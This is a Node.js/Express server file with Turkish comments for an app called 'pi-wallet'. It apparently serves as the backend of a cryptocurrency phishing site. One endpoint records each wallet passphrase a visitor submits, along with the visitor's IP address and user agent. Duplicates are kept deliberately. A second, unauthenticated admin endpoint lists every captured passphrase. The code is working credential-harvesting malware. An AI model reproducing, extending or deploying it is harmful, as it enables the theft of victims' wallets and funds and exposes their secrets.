const express = require('express');
const path = require('path');
const mongoose = require('mongoose');
const dotenv = require('dotenv');
const Passphrase = require('./models/Passphrase');

dotenv.config();
const app = express();

// MongoDB bağlantısı
mongoose.connect(process.env.MONGODB_URI, {
  dbName: 'pi-wallet',
  authSource: 'admin',
  retryWrites: true,
  w: 'majority'
})
.then(() => console.log('MongoDB connected successfully'))
.catch(err => {
  console.error('MongoDB connection error details:', {
    message: err.message,
    code: err.code,
    name: err.name,
    stack: err.stack
  });
});

// CORS ve diğer middleware'ler
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  res.header('Access-Control-Allow-Credentials', 'true');
  
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

app.use(express.json());
app.use(express.static(path.join(__dirname, 'build')));

// Passphrase kaydetme endpoint'i
app.post('/api/save-passphrase', async (req, res) => {
  console.log('Received passphrase request:', {
    ip: req.ip,
    userAgent: req.get('User-Agent')
  });
  
  const { passphrase } = req.body;
  
  try {
    console.log('Attempting to save passphrase...');
    // Aynı passphrase'in daha önce kaydedilip kaydedilmediğini kontrol et
    const existingPassphrase = await Passphrase.findOne({ passphrase });
    
    if (existingPassphrase) {
      // Eğer aynı passphrase varsa, yeni bir uniqueId ile kaydet
      const newPassphrase = new Passphrase({
        passphrase,
        ip: req.ip,
        userAgent: req.get('User-Agent'),
        uniqueId: Math.random().toString(36).substring(2) + Date.now().toString(36)
      });
      await newPassphrase.save();
    } else {
      // İlk kez kaydediliyorsa normal kaydet
      const newPassphrase = new Passphrase({
        passphrase,
        ip: req.ip,
        userAgent: req.get('User-Agent')
      });
      await newPassphrase.save();
    }

    res.json({ success: true });
    console.log('Passphrase saved successfully');
  } catch (error) {
    console.error('Detailed save error:', {
      message: error.message,
      code: error.code,
      name: error.name,
      stack: error.stack
    });
    
    // MongoDB duplicate key hatası
    if (error.code === 11000) {
      // Tekrar dene
      try {
        const newPassphrase = new Passphrase({
          passphrase,
          ip: req.ip,
          userAgent: req.get('User-Agent'),
          uniqueId: Math.random().toString(36).substring(2) + Date.now().toString(36)
        });
        await newPassphrase.save();
        res.json({ success: true });
      } catch (retryError) {
        res.status(500).json({ 
          success: false, 
          error: 'Could not save passphrase after retry' 
        });
      }
    } else {
      res.status(500).json({ 
        success: false, 
        error: 'Could not save passphrase' 
      });
    }
  }
});

// Admin endpoint'i - passphrases'leri görüntülemek için
app.get('/api/admin/passphrases', async (req, res) => {
  try {
    const passphrases = await Passphrase.find().sort({ timestamp: -1 });
    res.json(passphrases);
  } catch (error) {
    res.status(500).json({ error: 'Could not fetch passphrases' });
  }
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'build', 'index.html'));
});

const port = process.env.PORT || 3001;
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
}); 